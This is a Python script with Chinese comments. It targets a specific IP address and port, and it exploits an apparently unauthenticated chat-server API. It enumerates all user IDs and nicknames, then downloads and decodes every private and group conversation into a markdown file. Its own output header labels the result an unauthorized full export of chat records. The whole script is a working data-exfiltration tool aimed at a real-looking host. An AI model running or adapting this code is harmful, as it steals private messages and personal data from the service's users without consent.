# -*- coding: utf-8 -*-
import json, base64, time, datetime, urllib.request, urllib.parse, sys

BASE = "http://43.198.164.35:5300"
TS   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUT  = f"43.198.164.35_聊天记录全量_{TS}.md"
PAGE = 200
START_TS = time.time()

def log(m): print(m, file=sys.stderr, flush=True)

def req(path, tries=3, timeout=30):
    last = None
    for i in range(tries):
        try:
            with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            last = e
            if i < tries - 1: time.sleep(0.5 * (i + 1))
    raise last

def b64_content(payload):
    if isinstance(payload, dict):
        return payload.get("content") or payload.get("text") or json.dumps(payload, ensure_ascii=False)
    if not isinstance(payload, str):
        return json.dumps(payload, ensure_ascii=False)
    try:
        o = json.loads(base64.b64decode(payload, validate=False).decode("utf-8", "replace"))
        if isinstance(o, dict):
            return o.get("content") or o.get("text") or json.dumps(o, ensure_ascii=False)
        return o
    except Exception:
        return payload

# ---- 之前那个「爬 uid」的 connz 分页脚本（内嵌），并顺带抓昵称 ----
uids, seen_u, name_map = [], set(), {}

def extract_u_and_nick(x):
    """从 connz 的任意元素（dict / 字符串 / ["33533",{...}] 混合项）里挖 出 uid 和昵称"""
    if isinstance(x, dict):
        u = x.get("uid") or x.get("user_id") or x.get("id")
        if u is not None:
            nick = x.get("nickname") or x.get("name") or x.get("nick") or x.get("username")
            return u, nick
        for v in x.values():
            r = extract_u_and_nick(v)
            if r[0] is not None: return r
        return None, None
    if isinstance(x, (list, tuple)):
        for v in x:
            r = extract_u_and_nick(v)
            if r[0] is not None: return r
        return None, None
    if isinstance(x, (str, int)):
        return x, None
    return None, None

def fetch_uids_and_names():
    off, lim = 0, 200
    while True:
        try:
            d = req("/api/connz?" + urllib.parse.urlencode({"offset": off, "limit": lim}))
        except Exception as e:
            log(f"[!] connz off={off} 失败: {e}"); break
        arr = d.get("connections") if isinstance(d, dict) else d
        if not isinstance(arr, list): arr = []
        for it in arr:
            u, nick = extract_u_and_nick(it)
            if u is not None and u not in seen_u:
                seen_u.add(u); uids.append(u)
                if nick and u not in name_map: name_map[u] = nick
        total = d.get("total") if isinstance(d, dict) else len(arr)
        off += len(arr)
        if (total and off >= total) or not arr: break
    if off and off % 500 == 0: pass

fetch_uids_and_names()
TOTAL_U = len(uids)
log(f"[+] UID 抓取完成: {TOTAL_U} 个，昵称映射 {len(name_map)} 个")

def who(u):
    if u is None or u == "": return "?"
    return f"{name_map[u]}({u})" if u in name_map else str(u)

# ---- 消息拉取（offset 分页） ----
def fetch_all_msgs(cid, ctype, on_batch=None):
    msgs, offset, guard, seen = [], 0, 0, set()
    while guard < 500:
        q = urllib.parse.urlencode({"channel_id": cid, "channel_type": ctype,
                                   "limit": PAGE, "start_message_seq": offset})
        try:
            d = req("/api/messages?" + q)
        except Exception as e:
            log(f"    [!] cid={cid} off={offset} 失败: {e}"); break
        arr = d.get("data") if isinstance(d, dict) else d
        if not isinstance(arr, list) or not arr: break
        new = []
        for a in arr:
            if isinstance(a, dict):
                key = (a.get("timestamp"), a.get("payload"))
                if key not in seen:
                    seen.add(key); new.append(a)
        if not new: break
        msgs.extend(new)
        if on_batch: on_batch(new)
        offset += len(arr)
        if len(arr) < PAGE: break
        guard += 1
    return msgs

def dt(ts):
    try: return datetime.datetime.fromtimestamp(int(ts)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception: return str(ts)

def channels_of(uid):
    try:
        cv = req(f"/api/conversations?uid={uid}")
    except Exception as e:
        log(f"[!] uid={uid} conversations 失败: {e}"); return []
    out = []
    def walk(o):
        if isinstance(o, list):
            for x in o: walk(x)
        elif isinstance(o, dict):
            if o.get("channel_id") is not None and o.get("channel_type") in (1, 2):
                out.append(o)
            else:
                for v in o.values(): walk(v)
    walk(cv)
    return out

def collect_uids(o):
    out = []
    def w(x):
        if isinstance(x, list):
            for i in x: w(i)
        elif isinstance(x, dict):
            if x.get("uid") is not None: out.append(x["uid"])
            else:
                for v in x.values(): w(v)
    w(o); return sorted(set(out))

# ---- 流式落盘 ----
fp = open(OUT, "w", encoding="utf-8")
def W(*s):
    for x in s: fp.write(str(x) + "\n")
def FL(): fp.flush()

W("# 43.198.164.35:5300 未授权聊天记录全量导出", "",
  f"- 目标: `{BASE}`",
  f"- 开始时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
  f"- uid 总数: **{TOTAL_U}**", "",
  "> channel_type: 1=私聊, 2=群聊；正文已 base64 解码；发送人 = from_uid + 昵称映射", "")
FL()

G = M = P = err = 0
for idx, uid in enumerate(uids, 1):
    el = max(time.time() - START_TS, 0.001)
    rate = idx / el
    eta = (TOTAL_U - idx) / rate
    log(f"[{idx}/{TOTAL_U}] uid={uid}  会话={G} 消息={M}  已用 {el/60:.1f}m ETA {eta/60:.1f}m")

    chans = channels_of(uid)
    if not chans:
        W(f"## uid: `{uid}`", "- (无会话)", ""); FL(); continue

    W(f"## uid: `{uid}`"); FL()
    for c in sorted(chans, key=lambda x: -int(x.get("timestamp") or 0)):
        ctype, cid = c["channel_type"], c["channel_id"]
        kind = "私聊" if ctype == 1 else "群聊"
        G += 1
        if ctype == 2: P += 1
        W(f"### {kind} · `{cid}`")
        if ctype == 2:
            try:
                ch = req(f"/api/channels?channel_id={cid}&channel_type=2")
                ids = collect_uids(ch)
                if ids: W(f"- 成员({len(ids)}): {', '.join(who(i) for i in ids)}")
            except Exception: pass

        def on_batch(batch):
            for b in batch:
                fu = b.get("from_uid") or b.get("sender")
                W(f"- `{dt(b.get('timestamp'))}` **{who(fu)}**: {b64_content(b.get('payload'))}")
            FL()

        try:
            got = fetch_all_msgs(cid, ctype, on_batch=on_batch)
        except Exception as e:
            log(f"[!] cid={cid} 异常: {e}"); err += 1; got = []
        M += len(got)
        W(f"_(共 {len(got)} 条)_", "")
    W(""); FL()

W("---",
  f"**统计: {TOTAL_U} uid / 私聊会话 {P} / 全部会话 {G} / 消息 {M} / 失败 {err}**",
  f"**完成于: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  耗时 {(time.time()-START_TS)/60:.1f} min**")
FL(); fp.close()
log(f"\n[+] 完成: 会话 {G}, 消息 {M}, 失败 {err}\n[+] 已保存到: {OUT}")
